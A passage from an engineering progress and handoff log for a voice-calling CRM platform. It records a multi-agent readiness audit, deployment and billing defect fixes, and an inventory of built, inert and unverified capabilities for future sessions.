reasonable conclusion was that we had only recorded the first five minutes. TTL is now
derived per call from the metered duration. `start_ms` had been on every transcript turn
since the pipeline was written and NOTHING read it; turns are now seek targets.

**Key moments are computed once at storage, never per listen** (D-156). Research settled
the tempting version: ID3v2 `CHAP`/`CTOC` and WebVTT chapter tracks are both real
standards that browsers ignore on `<audio>`, so embedding buys nothing and costs a
container rewrite plus chapter titles quoting the caller inside an object that can only be
deleted, never redacted. Markers live beside the player instead. The derived half exists
because it CANNOT be wrong — `anchor_of` returns a turn's own offset or None, never an
approximation — and there is exactly one model kind rather than a taxonomy, because D-36
records Telugu extraction quality as UNMEASURED and rendering an unscored classification
as fact is a claim we cannot support until task #87 runs.

**Our knowledge and the vendor's copy only ever agreed at publish time** (D-158). A KB is
the object here with the longest gap between writes, so a console edit or a publish that
committed at the vendor and rolled back here stayed invisible for months. The sweep reads
both directions and REPORTS ONLY: the repair a KB drift invites is `detach_kb`, an
irreversible delete at the vendor of a document our tables by hypothesis cannot describe.
Its honest limit is recorded rather than papered over — an empty listing is `unreadable`,
not `missing`, unless another agent in the same tick proves the vendor attributes its
listing by agent (pilot gate 8, still open on an external blocker).

**The coverage ratchet was finally scored**, owed since `189c268`. Two earlier attempts
stalled under five-agent contention and were killed rather than report a number the
ratchet itself refuses to vouch for. On a fresh database with Redis flushed:
`COVERAGE RATCHET: OK (7 guarded surfaces, all at their floor)` — compliance-gate,
voice-runtime-ack and platform-credentials at 100%, redaction the weakest at 97.9%.


## §71 — a seven-agent audit, then the two stages that make a deploy possible and honest

The wave that stopped adding features and asked whether the thing could ship.

**Seven agents in parallel, one subsystem each: 34 findings, 12 BLOCKER, 17 SERIOUS.** The
headline is not any single one — it is that **the first deploy on a fresh host could not
have completed, for six independent reasons**, none of which any test could see because
every one of them is about a step that had never been run. Two findings were reached
independently by two agents each (a call billed to us and to nobody; pm2 plus the browser
environment), which is the strongest evidence in the set. `docs/PRODUCTION-READINESS.md`
carries all 34 with a five-stage fix sequence; the sequence is dependency order, not a
schedule.

**Stage 1 — the deploy.** `alembic/env.py` passed no `transaction_per_migration`, and
alembic defaults it to False: one transaction for the whole `upgrade head`, so a failure
at revision 40 discarded the 39 before it — while three operator-facing documents told
the reader the opposite in the three places they are read at 3am. Three revisions use
`autocommit_block()` for `CREATE INDEX CONCURRENTLY`, which alembic's own docstring names
as the case that setting exists for, so a failed run could leave an INVALID unique index
on `credit_ledger` behind a commit boundary. Nothing had ever inserted an `admin_users`
row, so a fresh deploy came up green with an empty allowlist and every admin request
403ing — a deployment with no way in, which is why `scripts/bootstrap_admin.py` exists.
`vps-deploy.sh` reloaded a pm2 app nothing had ever started, brought up no redis (every
swap passes `--no-deps`, which is exactly the flag that skips `depends_on`), and ran
`scripts/seed.py` nowhere, so production would have had no reserved slugs and no retention
defaults. All eight items are closed.

**Three of the eight were not what the finding said, and the corrections outlast the
fixes.** P5.6 claimed botocore raises `NoRegionError` without a region; measured, **for
s3 it does not** — it falls back to `us-east-1` and signs with it, so this was never a
crash, it was every request scoped to a region nobody chose. The credential half was real
and larger: with no `AWS_ACCESS_KEY_ID` every object-store path fails, including
`retention._erase_*`, where a store that will not answer stands between an erasure and a
certificate claiming a deletion that did not happen. And the fix as written said to add
the three variables to `.env.example` — which `tests/env_example_bootstrap_floor_test`
correctly refuses, because that file is the set a process needs to BOOT and a
credential-less process boots perfectly well.

**Two more defects were inside the eight lines P5.6 pointed at.** `_client()` used
`boto3.client(...)`, which resolves through a process-global `DEFAULT_SESSION` — the exact
defect D-106 found and fixed in `apply_lifecycle.py`, in the copy that never got it. It
**reproduced live during the sabotage check**: with the global session restored, a test
that had deleted both credentials from the environment still presigned successfully,
signing with a key an earlier test had cached. And the client was rebuilt per call: ~90ms
of botocore service-model loading, on the API event loop, for every recording playback.
One cached client per process, keyed on a digest of (endpoint, region, credentials).

**Stage 2's money cluster: the platform was giving its own margin away.** `charge_for_call`
debited the prepaid wallet with `cost.total_inr` — the ENGINE's charge to US, ~₹2/min —
while `self_serve_inr_per_min` (₹6.00) was read in exactly one place, to render the
runway string on the client's own screen. The wallet drained at a third of the advertised
rate and **the self-serve motion booked zero gross margin**. One layer up,
`spend_state.spend_used` had the same two-facts-in-one-column problem: the compliance
gate's ceiling, the client's own cap route and the client usage panel all read our
supplier cost, so a client capping at ₹5,000 was stopped at ₹5,000 of OUR cost and shown
our pricing to explain it — three functions below the comment stating that the client
panel never shows it.

`billing/rates.py::client_billed_inr` is now the one answer to "what does the client owe",
migration `c4f18a6b90e2` gives it a column, and `cost.total_inr` appears in neither write.
**The forks inside it are the interesting part.** A managed tenant with no quoted rate
accrues NOTHING rather than being priced at the list rate — tried, then rejected, because
the same rate prices the panel, the cap AND the invoice, and `b1d5c8e73f04` already
settled that this repository does not invent a price a plan does not quote. The included
allowance is netted off per MONTH rather than per call, computed against the counter under
the lock the meter already holds, so the increment does not depend on the order calls
meter in.

**The third writer of `capped` is what no existing test could see.** Swapping
`_RECOMPUTE_CAPPED` back to `spend_used` passed the entire suite, because every fixture
put both numbers on the same side of the ceiling. `tests/client_rate_billing_test.py`
puts the cap between them — ₹1.90 of cost, ₹8.00 billed, capped at ₹5.00 — and it is the
only thing standing between the client's stop button and the meter disagreeing about what
"over cap" means.

**And a call that completed and could not be priced was a non-event.** `_meter` returned
0: no usage row, no charge, no counter — and `_pipeline_settled` only expects a usage
artefact when a cost exists, so the reconciliation poller, D-31's *guarantee of record*,
classified the call `settled` and never came back. Since every client-facing money figure
derives from `usage_events` rather than from `calls`, the blast radius of the vendor
spelling `total_cost` differently on the live account is every panel reading ₹0.00, every
invoice empty, no cap arming, no wallet debited — **and nothing anywhere going red.**
Refusing to invent a price was right; refusing to COUNT the refusals was the defect. Now
`snapshot.billable_ready and cost is None` alerts, the adapter logs its own refusal, and
`calls_unmetered` is a sixth signal on the admin health board at `stop` severity.

## State of the system — what a future session inherits

Written after the sweep above and deliberately separated into four states, because "built"
has meant four different things in this repo and conflating them is how a session
re-derives a decision that was already taken.

⚠ **This paragraph used to say "grep-verified against the tree at this commit". It was
not**, and a readiness audit found four claims that were wrong — every one of them in the
same direction: a capability had been BUILT and this inventory still described it as
missing (`PROVIDER_CREATES_ORDERS`, WhatsApp's adapter, the guardrail count, and ROADMAP
§5's twin of the first). Understating is not the safe error. Somebody reads "no checkout
can be opened" and rebuilds the checkout. **Section 5 of `scripts/check_docs_drift.py`
(D-102) now enforces the part of that promise a machine can hold**: any sentence in this
repo that STATES a capability constant's value is compared against the constant, and CI
fails if they disagree. What is still on a human is the class no matcher can decide — a
paragraph that describes a capability without quoting a constant, which is exactly how the
WhatsApp row stayed wrong. When you write an entry here, quote the constant with its
value; that is the half that cannot rot silently.

**Built and working end to end** — meaning: code, tests, a mounted route, a screen where
the surface is client- or operator-facing, and a guardrail where a rule needs one. One
caveat governs the whole list and is not repeated inside it: **no part of this has run
against the real voice engine or a real PSTN call.** End to end here means through the
`fake` adapter and the conformance suite; the vendor half is the fourth state below. The
tenancy and RLS spine, with cross-tenant tests. The agent lifecycle including two-speed
publishing (staged vs live pointers, Apply/Undo admin-realm, the client's derived
unsaved-changes banner). The post-call pipeline: transcript, redaction, extraction, lead
upsert, metering, hot-lead email. Campaigns end to end with the compliance gate, per-dial
enforcement, per-campaign narrowing windows and retry ladders; escalation after a spent
ladder is complete up to the SEND, which is inert below.
The CRM surfaces — leads list and board, performance, needs-attention queue, call detail.
Inbound webhook ingest including native Meta Lead Ads intake, and the instant-lead callback.
DNC on every dispatch path. The consent ledger, with `messaging` as a separate purpose from
consent to be called. DPDP subject export and erasure with a proof certificate. Billing:
metering, effective-dated plan resolution, invoices as derived statements, admin and client
caps with the ops recompute. KYC and the first-campaign hold, both gates plus both consoles
plus the client's own screens plus the cross-tenant hold queue. Outbound CRM sync (webhook
half). OTel tracing across every boundary, Sentry, and `alert()` with a real email
transport. Outbound CRM sync's Sheets half, adapter included, though nothing has yet spoken
to a real Google project. **Twelve** checks in `make guardrails` — `lint-imports` plus the
eleven `scripts/check_*` modules the target invokes; count them in the recipe, not here,
because this number has been wrong twice (it said ten while the tree ran twelve). The
newest two are bootstrap-key isolation (D-95) and config `applies` classification (D-101),
joining half-wiring, compliance invariants, docs drift and the web tier's env parity. The
coverage ratchet is NOT among them: it is a SEPARATE target with different preconditions
(both stores empty), and a reader who runs `make guardrails` believing it covers the
ratchet gets a weaker gate than they think.
Beside it the frontend gate, 638 tests over every screen in both realms at
§61 (this said 364 for several sections; the number moves every wave and is not worth
chasing — read `pnpm -C apps/web test` if the exact figure matters).
The console speaks one design language from tokens in `globals.css`, and sign-in exists for
both Clerk realms behind two guards that refuse to ship the dev credential.

**Built but INERT, and why** — a mechanism exists, is tested, and does nothing today
because something outside the repo is missing. Each of these is one credential or one
decision wide, and each is named by a greppable selector rather than faked, so the refusal
is honest at the surface rather than silent in a worker:
- **The whole backup tree.** `infra/backup/` has been applied to nothing and **no wal-g
  command has ever been run**. Nothing is deployed, every secret is a reference.
- **Razorpay order creation.** ⚠ **This entry said the adapter did not exist. It does**
  (D-98): `PROVIDER_CREATES_ORDERS` is True, `RazorpayOrders.create_order` is written,
  `POST /v1/orders` is mounted and the order is created SERVER-SIDE so
  `notes.calevate_tenant_id` reaches the provider by construction. What is inert is the
  DEPLOYMENT, and D-98 exists to keep the two facts apart: `PaymentCapability.creates_orders`
  is False on every box we run, with its own reason `no_api_secret` — no Razorpay API
  secret is configured anywhere, so no checkout can be opened from a top-up intent today.
  "An adapter exists" and "this box can take a payment" are different sentences and the
  first one is now true. The signing scheme is still unverified against a live account,
  and no checkout widget was built at all (`checkout.js` is a supply-chain decision,
  hard rule 9); the signed webhook, never the browser callback, is the source of truth.
- **WhatsApp.** ⚠ **This entry said "no vendor adapter, because no decision picks a BSP".
  Both halves were false**: D-91 picked the **Meta Cloud API** (direct, no BSP reseller),
  and `apps/workers/whatsapp_cloud.py` implements the transport — one POST to
  `/{phone-number-id}/messages`, template gate encoded, status classification, driven
  through `httpx.MockTransport` in tests. What is inert is the vendor relationship:
  `CLOUD_API_CONFIRMED_AGAINST_LIVE_WABA` is False, we hold no WABA, no phone number id
  and no token, and this module has never exchanged a byte with Meta. Everything above
  the send — transport protocol, console dev sink, delivery records, retry ladder,
  escalation path — was already complete and remains so.
- **Google Sheets sync.** Delivered through the same job as the webhook half; refused at
  endpoint creation while no service account exists.
- **Meta Lead Ads field retrieval.** Intake is native and the Graph read is **built**
  (D-90): `LEAD_RETRIEVAL_IMPLEMENTED` is True and `GET /{leadgen_id}?fields=field_data`
  sits behind the `LeadRetriever` Protocol, feeding the existing consent gate. Inert for
  a credential only — the Page token with `leads_retrieval` that this deployment does not
  hold — so a verified delivery still lands as a recorded `meta_lead_retrieval_unavailable`
  refusal, re-claimable the day a token exists.
- ~~**`redact_trace_payload`.**~~ No longer inert and no longer present: it was DELETED
  (D-61) once the audit found that hard rule 6 was being broken on the tracing path by the
  OTel SDK's own exception events. Redaction is now automatic in `_RedactingSpanExporter`.
- **`kb_retrieval_logs`.** No producer, and cannot have one until the engine reports a
  retrieval — three of its columns are the dated deferrals in `UNWIRED_BASELINE`.
- ~~**`inbound_webhooks` rows**, provisioned out of band because nothing writes them.~~
  **FALSE SINCE `61e8470`, and this file contradicted ITSELF for eleven sections** — §49
  above already records that "`inbound_webhooks` finally has a writer".
  `ingest/service.py` INSERTs them, `POST /v1/lead-sources` is the client-realm creator,
  and `/c/[slug]/lead-sources` is the screen. A client provisioning their own lead source
  is a SELLABLE capability that this list was describing as inert. Kept struck through as
  the standing example of why this section needs re-reading against the code, not trusted.
- **`self_serve_signup_enabled`**, defaulting OFF. All six R-11 mitigations now hold in
  code, so this is a business switch rather than a blocked one.
- **`plans.overage_rate_value`**, present and NULL on every plan until a retail number is
  decided.
- The remaining SIX entries of `UNWIRED_BASELINE` (this line said seven until §58; §57
  closed three of nine and the prose was not updated with them), each keyed per column and each naming
  what closes it. The list may only shrink; the guard fails if an entry no longer holds.

**Deliberately NOT built, with what would change it.** No vector infrastructure of ours
(D-28: RAG is a managed API; the T1/T2 tiers are absent by decision, and a bake-off
decides the provider). No message broker, no second backend language, no Temporal — ARQ
until a workflow needs more than idempotency and a retry ladder. No Langfuse or PostHog
configuration: it was REMOVED rather than left looking wired, and restoring it needs a
project plus a decision-log entry choosing a second tracing pipeline beside OTel. No
`EXCLUDE` non-overlap constraint on plans — it would refuse the table's own contents, and
resolution is a total order instead. No proration across a plan change. No document store
or CAF workflow for KYC, because the law on a non-licensee reseller is unsettled and
modelling unsettled law is worse than not modelling it. No bypass flag on the compliance
gate, not for testing. No second alert sink, no dead-man heartbeat outside the failure
domain (it adds a vendor). No number provisioning, transfer or test-call gate — those are
pilot-gated, below.

**UNVERIFIED against a vendor — pilot gates, not facts.** These read as design intent
everywhere they appear and must not be re-read as measurements. The Bolna pilot
(OPERATIONS §2) owns most of them: webhook trust and loss behaviour, full API provisioning,
Telugu STT/TTS quality, **real-PSTN latency (we hold zero measurements — every latency
number in TRD §4 is a target)**, Telugu turn-taking, post-call data fidelity, KB
multilingual mode and the two KB-lifecycle questions D-41's detach contract cannot answer
from docs, compute region and residency, the agency/sub-account model, and every
commercial number including the BYOK platform fee that decides the unit economics.
Outside the pilot: wal-g against R2 (open multipart-rejection issues across clients, so the
first hand-run push is a watched test and the fallback is that chain A moves providers),
the 15-minute RPO (a design intent until a drill measures it), and Razorpay's signing
scheme and payload paths.

### Where the next session should start

1. **Founder decisions, none of them code.** Re-verified at §62 and all still open — but
   note the TOOLING around two of them moved after this paragraph was written: the retail
   value-tier rate is now SETTABLE per tenant through the commercials screen (D-66), so it
   is a number somebody must choose rather than a place to put it. Originally verified at
   the close of §50 and all still
   open; neither §49 nor §50 touched any of them: the retail value-tier rate
   (`plans.overage_rate_value` exists and is NULL on every seeded plan); the retention TTL
   divergence (docs 24 months, seed 365 transcript / 1095 lead / 90 recording — SEC-COMP §4
   declares it open and names the founder); erasure vs the TRAI 90-day recording floor; and
   a WhatsApp BSP, still the single entry that unblocks the escalation path end to end.
   Also open, from D-47: whether a non-licensee reseller must itself hold the CAF, or
   whether furnishing the entity's documents to the licensed operator discharges us — a
   legal question, nothing blocks on it today, and it decides whether `kyc_records` ever
   grows a document workflow.
   **The biggest one, unchanged since §49 and now with its operator surface built:**
   **turning `self_serve_signup_enabled` on is a business decision rather than a blocked
   one.** All six R-11 mitigations ship in code —
   platform-fixed calling hours, DNC on every dispatch path, the NOT NULL disclosure, the
   consent ledger, admin + client spend caps, and now the first-campaign manual-review
   hold. The remaining objections are commercial and operational (who reviews the held
   accounts, how fast, and whether a stranger can pay — server-side order creation is still
   not built), not architectural: §50 built the work list those reviewers read, so "who
   reviews" is now a staffing answer rather than a tooling one. Two more arrive with the
   backup work: whether the 35-day
   backup retention is stated to clients as a DPDP commitment beyond D-50's record of it,
   and whether an external dead-man heartbeat is worth its dependency — today an extended
   VPS outage is detected by a human noticing.
2. **Gated on the Bolna pilot** (OPERATIONS §2) and deliberately unbuilt: number
   provisioning, transfer, the test-call gate, real latency numbers, and the KB questions
   at gate 8 (whether the list response carries agent linkage; whether deleting a KB
   clears the agent's reference).
3. **The pre-launch checklist (OPERATIONS §8) has two items that look done and are not,
   and both are now GATES with a defined pass condition rather than opinions.**
   - **"Backups verified"** cannot be ticked by the existence of `infra/backup/` — **no
     wal-g command in that tree has ever been run**, nothing has been applied to any host,
     `runbooks/database-restore.md` carries an UNVALIDATED banner naming its first user as
     the person who removes it, and wal-g against R2 remains the largest unverified vendor
     assumption in the backup work. The gate is `runbooks/backup-restore-drill.md` PASSING
     once with the result recorded in `docs/evidence/` — which today holds the pilot
     scorecard template and the Outpero research only, i.e. no drill record exists. Until
     that record exists the 15-minute RPO is a design intent, not a measurement.
   - **"Alerts firing to Sri's phone"** is now deliverable and is still not delivered by
     deploying the code. It needs `ALERTS_EMAIL` plus a reachable SMTP host in the
     environment; a non-local service booting with neither logs
     `alert_delivery_unconfigured`, and one with a recipient but no transport logs
     `alert_delivery_has_no_transport` — both at boot, precisely so this is not discovered
     at 3am. On the database host the same configuration is what makes the backup relay
     page, and local delivery success is transport acceptance rather than receipt, so the
     proof is `notify.sh probe` landing in a real inbox.
4. **What is inert, deliberately unbuilt, or vendor-unverified is now written up once**,
   in "State of the system" immediately above this list. Read that before proposing
   anything: it is the section that stops a session rebuilding a decision or treating a
   pilot gate as a fact.
5. **The local database cannot reach head** and that is expected — see
   `runbooks/stale-dev-database.md`. Use a scratch DB; do not stamp past the credit-ledger
   index.
6. **The frontend item this list once flagged as mid-flight has LANDED** — confirmed at
   §55, not assumed. `apps/web/src/lib/lookup.ts` is the one prototype-chain guard, with
   `tests/wireLookup.test.tsx` and `tests/wireLookupGuard.test.ts` behind it, and no
   source file cites the `tests/kyc.test.ts` that never existed. Nothing to check here
   any more; the entry stays as the record that a comment claiming coverage is a defect
   class this repo has produced twice.
7. **`audit_log` on any long-lived database carries PERMANENT breaks** from the era when
   the chain lock was decorative (§55), and an append-only ledger cannot be repaired. So
   `GET /v1/ops/audit/verify` legitimately answers `ok: false` on a developer database,
   and every test in this repo asserts a DELTA — "these writers added no break" — never a
   globally clean chain. A test written the other way is green in CI and red on every
   developer's machine for a reason that is not theirs.
8. Run `bash scripts/dev_bootstrap.sh`, then `uv run pytest -q`, `uv run mypy apps packages`,
   `make guardrails` and `make web-check` (typecheck + lint + the vitest suite) before
   changing anything. `make coverage-ratchet` additionally needs BOTH stores empty — a
   freshly migrated and seeded database and a flushed Redis — and refuses to score
   otherwise rather than reporting a number it cannot vouch for.
